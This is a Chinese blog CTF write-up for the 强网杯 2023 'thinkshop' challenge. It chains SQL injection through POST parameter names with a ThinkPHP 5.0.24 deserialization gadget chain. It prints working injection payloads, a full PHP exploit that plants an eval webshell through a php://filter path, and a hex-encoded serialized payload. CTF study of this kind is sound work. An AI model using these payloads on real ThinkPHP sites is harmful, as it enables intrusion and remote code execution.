@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="thinkshop Thinkphp 5.0.24 反序列化（任意文件写入）漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkshop(强网杯 2023)">
+<meta property="og:url" content="http://example.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/index.html">
+<meta property="og:site_name" content="Once">
+<meta property="og:description" content="thinkshop Thinkphp 5.0.24 反序列化（任意文件写入）漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218160927711.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218161045651.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162204570.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162312003.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162424479.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162553626.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162738537.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162902309.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218162814328.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163250760.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163342381.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163510964.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163526322.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163824248.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218163844583.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218164347802.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218164613585.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165045003.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165115340.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165244243.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165701575.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165720197.png">
+<meta property="og:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218165742506.png">
+<meta property="article:published_time" content="2023-12-18T09:07:15.073Z">
+<meta property="article:modified_time" content="2023-12-18T09:09:24.080Z">
+<meta property="article:author" content="Once">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/emmm159/images/raw/master/img/image-20231218160927711.png">
+
+<link rel="canonical" href="http://example.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>thinkshop(强网杯 2023) | Once</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Once</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">27</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="Once">
+      <meta itemprop="description" content="forever">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Once">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          thinkshop(强网杯 2023)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-18 17:07:15 / 修改时间：17:09:24" itemprop="dateCreated datePublished" datetime="2023-12-18T17:07:15+08:00">2023-12-18</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>thinkshop</p>
+<p>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
+<span id="more"></span>
+
+<meta name="referrer" content="no-referrer">
+
+<h3 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h3><p>复现</p>
+<p>docker：[源码](C:\Users\AtOnce\Desktop\平平无奇\WEB\比赛源码\强网杯 2023\thinkshop)</p>
+<p>thinkphp源码：<a target="_blank" rel="noopener" href="https://gitee.com/emmm159/images/blob/master/source/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/html.zip">源码</a></p>
+<p>知识点：</p>
+<ul>
+<li>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</li>
+</ul>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
+<p>打开后的首页，首页什么信息都没有，只有一个fake_flag查看详情里也没有什么信息</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218160927711.png" alt="image-20231218160927711"></p>
+<p>直接看源码</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218161045651.png" alt="image-20231218161045651"></p>
+<p>这些都是主要文件，先随便看一个html页面，发现需要登录</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162204570.png" alt="image-20231218162204570"></p>
+<p>这里登录的后端是Admin.php中的do_login()方法</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162312003.png" alt="image-20231218162312003"></p>
+<p>需要满足输入的密码经过md5等于admin数据表中的password字段内容</p>
+<p>这里可以去查看docker中的数据库</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162424479.png" alt="image-20231218162424479"></p>
+<p>可以看到用户民和密码，密码经过爆破解码是123456</p>
+<p>但是登录使用的用户名不能用admin，只能使用1，否则会显示用户名或密码错误</p>
+<p>登录后就多出了两个功能，添加商品和进入修改</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162553626.png" alt="image-20231218162553626"></p>
+<p>继续看源码，可以在源码中找到非常奇怪的地方</p>
+<p>一个是goods_edit.html中有反序列化函数</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162738537.png" alt="image-20231218162738537"></p>
+<p>这里的作用就是进行修改时会将原来的内容先返回</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162902309.png" alt="image-20231218162902309"></p>
+<p>还有一个就是goods.html中也有一个反序列化函数</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162814328.png" alt="image-20231218162814328"></p>
+<p>这里的作用就是在非管理员用户页面的查看详情那里，点击后会将数据库中的内容进行解码并反序列化会返回到网页中</p>
+<p>既然有反序列化函数了，那就看这里能不能控制，如果可以控制就可以使用Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
+<p>先来看data数据来自哪里，编辑页面使用了do_edit函数进行编辑，看这个方法进行了什么</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163250760.png" alt="image-20231218163250760"></p>
+<p>继续跟进</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163342381.png" alt="image-20231218163342381"></p>
+<p>跟进</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163510964.png" alt="image-20231218163510964"></p>
+<p>继续查看</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163526322.png" alt="image-20231218163526322"></p>
+<p>看到这里有sql语句拼接，其中的$data可以通过post传入</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163824248.png" alt="image-20231218163824248"></p>
+<p>这样传入，sql拼接后语句是以下图中内容</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163844583.png" alt="image-20231218163844583"></p>
+<p>可以看到其实post的参数就是$key，而值就是$value</p>
+<p>那么就可以通过拼接漏洞控制data内容了，之后只需要通过查看详情的反序列化函数即可触发反序列化漏洞</p>
+<p>接下来就是构造如何拼接才能控制</p>
+<p>需要控制$key处，那么就是修改post参数</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2731%27)/**/WHERE/**/`id`/**/%3d/**/3#=1 &amp;data=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164347802.png" alt="image-20231218164347802"></p>
+<p>经过井号将后面内容注释后就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE goods SET `id` = unhex(&#x27;32&#x27;), `name` = unhex(&#x27;737373&#x27;), `price` = unhex(&#x27;3130302e3030&#x27;), `on_sale_time` = unhex(&#x27;323032332d30352d30355430323a32303a3534&#x27;), `image` = unhex(&#x27;68747470733a2f2f692e706f7374696d672e63632f467a764e464247382f522d362d4849332d594b522d55462d4a47302d472d4e2e6a7067&#x27;), `data`=unhex(&#x27;31&#x27;)/**/WHERE/**/`id`/**/=/**/3#</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功控制了data内容</p>
+<p>然后就是使用poc构造payload了</p>
+<p>但是还需要找到一个可以写入文件的目录，一般都是在tmp目录下，这里寻找到&#x2F;runtime&#x2F;temp，也有写入权限</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164613585.png" alt="image-20231218164613585"></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Pipes&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Relation&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line">abstract class OneToOne extends Relation&#123;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class HasOne extends OneToOne&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//目的调用其write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#修改处</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Output对象,目的是调用__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line">class Query&#123;</span><br><span class="line">    protected $model;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handler = new File();//目的调用File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;#File</span><br><span class="line">class File&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;        =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27;          =&gt; &#x27;php://filter/write=string.rot13/resource=/var/www/html/runtime/temp/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line">class Pivot extends Model&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure>
+
+<p>将生成的数据进行十六进制编码</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%27547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f33313966513d3d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165045003.png" alt="image-20231218165045003"></p>
+<p>显示更新成功之后点击查看详情</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165115340.png" alt="image-20231218165115340"></p>
+<p>但是这里显示了数据错误，去源码中寻找以下为什么会显示数据错误</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165244243.png" alt="image-20231218165244243"></p>
+<p>看到data内容的前三个必须是YTo，base64解码后是a:</p>
+<p>也就是只有序列化数据是一个数组才能正常查看</p>
+<p>修改一下exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将上面的exp的最后一行改为</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(array(new Windows())));</span><br></pre></td></tr></table></figure>
+
+<p>然后再将执行的内容经过十六进制编码后打payload</p>
